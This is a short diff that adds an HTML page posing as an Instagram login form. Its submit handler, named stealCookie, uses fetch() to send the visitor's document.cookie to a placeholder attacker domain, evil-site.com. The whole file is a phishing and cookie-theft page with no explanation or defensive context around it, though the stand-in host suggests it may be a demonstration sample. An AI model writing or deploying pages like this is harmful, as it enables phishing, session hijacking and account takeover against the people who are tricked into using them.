@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Instagram Login</title>
+  </head>
+  <body>
+    <h2>Instagram</h2>
+    <form onsubmit="stealCookie()">
+      <input type="text" placeholder="Username" required><br>
+      <input type="password" placeholder="Password" required><br>
+      <button type="submit">Log In</button>
+    </form>
+
+    <script>
+      function stealCookie() {
+        fetch("https://evil-site.com/log?cookie=" + document.cookie);
+      }
+    </script>
+  </body>
+</html>
